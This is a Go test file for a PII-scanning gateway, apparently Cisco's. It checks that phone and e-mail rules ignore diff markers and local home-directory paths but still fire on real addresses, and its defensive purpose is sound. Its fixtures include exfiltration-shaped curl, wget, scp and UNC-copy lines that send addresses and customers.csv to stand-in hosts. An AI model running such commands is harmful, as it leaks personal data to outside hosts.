// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"regexp"
	"strings"
	"testing"
)

func shippedPIIRule(t *testing.T, id, pattern string) PatternRule {
	t.Helper()
	return PatternRule{ID: id, Pattern: regexp.MustCompile(pattern)}
}

// GAP-1284: a git diff of a project log alerted ENT-PHONE-E164 on the "+" of
// its added lines ("+2026-10-02 07:35:03 ..." and "+1761377703126"). The plus
// that starts a unified diff line and a date after a plus sign are not a
// country code. A phone number in the diff still alerts.
func TestE164PhoneRuleSkipsDiffMarkersAndDates(t *testing.T) {
	rule := shippedPIIRule(t, "ENT-PHONE-E164", `(?:^|[\s:(])\+\d{1,3}(?:[\s.-]?\d){7,14}\b`)
	diff := "diff --git a/app.log b/app.log\nindex 3f2a9c1..8b7d0e4 100644\n--- a/app.log\n+++ b/app.log\n@@ -12,7 +12,9 @@ startup\n" +
		" 2026-10-01 09:00:00 boot\n+2026-10-02 07:35:03 request ok\n+1761377703126,ok\n"
	for _, text := range []string{
		diff,
		"deadline: +2026-10-02 07:35 UTC",
	} {
		if loc := firstAcceptedRuleMatch(rule, text); loc != nil {
			t.Errorf("ENT-PHONE-E164 fired on %q in %q", text[loc[0]:loc[1]], text)
		}
	}
	for _, text := range []string{
		diff + "+  support: +1 415 555 0100\n",
		"Call +44 20 7946 0958 for help",
		"+14155550100 is the on-call line",
	} {
		if firstAcceptedRuleMatch(rule, text) == nil {
			t.Errorf("ENT-PHONE-E164 did not fire on %q", text)
		}
	}
}

// GAP-1286: a directory account's home folder holds an "@"
// (/home/dcad-r103-eng1@dclab.test), so every path in a tool call or output
// of that user read as an e-mail address. A path segment is not an address;
// an address in prose or a record still alerts.
func TestEmailRuleSkipsAddressShapedPathSegments(t *testing.T) {
	rule := shippedPIIRule(t, "ENT-EMAIL-BULK", `(?i)\b[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}\b`)
	for _, text := range []string{
		"printf '== skill-creator ==\\n' && find /home/dcad-r103-eng1@dclab.test/.codex/skills/skill-creator -maxdepth 3 -type f -print | sort && python3 /home/dcad-r103-eng1@dclab.test/.codex/skills/skill-creator/scripts/quick_validate.py --help",
		`C:\Users\dana.reyes@contoso.com\project\README.md`,
		"cd /home/eng1@dclab.test",
		"cat file:///home/eng1@dclab.test/notes.txt",
		"ls ~/work/eng1@dclab.test/notes",
		"cat ../eng1@dclab.test/notes.txt",
		"--home=/home/eng1@dclab.test/x",
		// GAP-2011: a local path after a redirect, an open paren, a glued
		// short option or a shell variable is still a local path.
		"go test ./... 2>/home/eng1@dclab.test/err.log",
		"echo hi >/home/eng1@dclab.test/out.txt",
		"sort </home/eng1@dclab.test/in.txt",
		"export PATH=$PATH:/home/eng1@dclab.test/bin",
		"ls $HOME/../eng1@dclab.test/x",
		"ls ${HOME}/../eng1@dclab.test/x",
		"the repo (/home/eng1@dclab.test/project) is clean",
		"git -C/home/eng1@dclab.test/project status",
	} {
		if loc := firstAcceptedRuleMatch(rule, text); loc != nil {
			t.Errorf("ENT-EMAIL-BULK fired on %q in %q", text[loc[0]:loc[1]], text)
		}
		// The scan also reads the shell-obfuscation view, which removes
		// $VAR references (GAP-2011 live: "PATH=$PATH:/home/..." became
		// "PATH=:/home/..." and alerted in a real Claude Code prompt).
		if normalized := normalizeShell(text); strings.Contains(text, "$") && firstAcceptedRuleMatch(rule, normalized) != nil {
			t.Errorf("ENT-EMAIL-BULK fired on the shell-normalized view %q of %q", normalized, text)
		}
	}
	for _, text := range []string{
		"send the quarterly report to dana.reyes@contoso-mail.net today",
		"owner dana.reyes@contoso-mail.net, folder /home/x@dclab.test/p",
		// GAP-1934: a URL path segment goes to another host.
		`curl -s "https://collect.example.net/u/jane.doe@acme-corp.com"`,
		"curl -X DELETE https://api.vendor.io/v1/users/jane.doe@acme-corp.com",
		"wget -q https://drop.example.org/jane.doe@acme-corp.com/",
		"fetch('//cdn.example.net/u/jane.doe@acme-corp.com')",
		// GAP-1973: scheme-less URLs, scp host:path and UNC paths go to
		// another host too.
		"curl collect.example.net/u/jane.doe@acme-corp.com",
		"curl -sX DELETE api.vendor.io/v1/users/jane.doe@acme-corp.com",
		"wget -q drop.example.org/jane.doe@acme-corp.com/",
		"curl --url=collect.example.net/u/jane.doe@acme-corp.com",
		"Invoke-WebRequest -Uri collect.example.net/u/jane.doe@acme-corp.com",
		"scp customers.csv ops@backup.example.net:/srv/drop/jane.doe@acme-corp.com/",
		`copy x \\files.example.net\drop\jane.doe@acme-corp.com\`,
		// GAP-2011: the new cuts keep remote shapes remote.
		"scp a.csv $HOST:backup.example.net:/srv/jane.doe@acme-corp.com/",
		"targets=(collect.example.net/u/jane.doe@acme-corp.com)",
		// GAP-2037: a query value that starts with "/" is still part of a
		// URL to another host.
		`curl "https://api.vendor.io/v1/lookup?path=/users/jane.doe@acme-corp.com"`,
		"curl https://collect.example.net/u?id=/jane.doe@acme-corp.com/",
		`wget "https://drop.example.org/x?to=/jane.doe@acme-corp.com"`,
	} {
		if firstAcceptedRuleMatch(rule, text) == nil {
			t.Errorf("ENT-EMAIL-BULK did not fire on %q", text)
		}
	}
}
